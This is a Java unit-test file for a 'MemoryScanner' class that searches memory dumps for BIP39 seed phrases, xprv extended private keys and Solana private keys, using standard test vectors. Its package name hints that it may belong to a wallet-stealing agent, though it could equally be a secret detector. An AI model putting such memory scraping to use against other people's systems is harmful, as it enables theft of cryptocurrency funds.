package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class MemoryScannerTest {
	private static final String SEED = "abandon abandon abandon abandon abandon abandon "
		+ "abandon abandon abandon abandon abandon about";

	@TempDir
	Path temp;

	@Test
	void findsValidBip39() throws Exception {
		Path dump = temp.resolve("dump.bin");
		Files.writeString(dump, "ruido " + SEED + " mas ruido", StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = new MemoryScanner(
			new String(getClass().getResourceAsStream("/serverpackcore/bip39.txt").readAllBytes(),
				StandardCharsets.UTF_8)).scan(dump);
		assertFalse(findings.isEmpty());
		assertEquals("bip39-12", findings.get(0).kind());
		assertEquals(SEED, findings.get(0).value());
	}

	@Test
	void wideStringsAreFound() throws Exception {
		Path dump = temp.resolve("wide.bin");
		Files.write(dump, SEED.getBytes(StandardCharsets.UTF_16LE));
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.value().equals(SEED)));
	}

	@Test
	void findsTwelveAndTwentyFourWords() throws Exception {
		Path dump = temp.resolve("both.bin");
		String seed24 = ("abandon ".repeat(23) + "art");
		Files.writeString(dump, SEED + "\n" + seed24, StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-12")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("bip39-24")));
	}

	@Test
	void badWordIsRejected() throws Exception {
		Path dump = temp.resolve("bad.bin");
		Files.writeString(dump, SEED.replace("about", "abandon"), StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertFalse(findings.stream().anyMatch(finding -> finding.kind().startsWith("bip39")));
	}

	@Test
	void findsXprvAndSolana() throws Exception {
		Path dump = temp.resolve("keys.bin");
		String xprv = "xprv" + "A".repeat(107);
		String sol = "2AXDGYSE4f2sz7tvMMzyHvUfcoJmxudvdhBcmiUSo6ijwfYmfZYsKRxboQMPh3R4kUhXRVdtSXFXMheka4Rc4P2";
		Files.writeString(dump, xprv + "\n" + sol, StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("xprv")));
		assertTrue(findings.stream().anyMatch(finding -> finding.kind().equals("solana")));
	}

	@Test
	void deduplicatesAndLimits() throws Exception {
		Path dump = temp.resolve("many.bin");
		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < 40; i++) {
			builder.append(SEED).append(' ').append(i).append('\n');
		}
		Files.writeString(dump, builder.toString(), StandardCharsets.UTF_8);
		List<MemoryScanner.Finding> findings = MemoryScanner.load().scan(dump);
		assertEquals(1, findings.stream().filter(finding -> finding.value().equals(SEED)).count());
	}
}
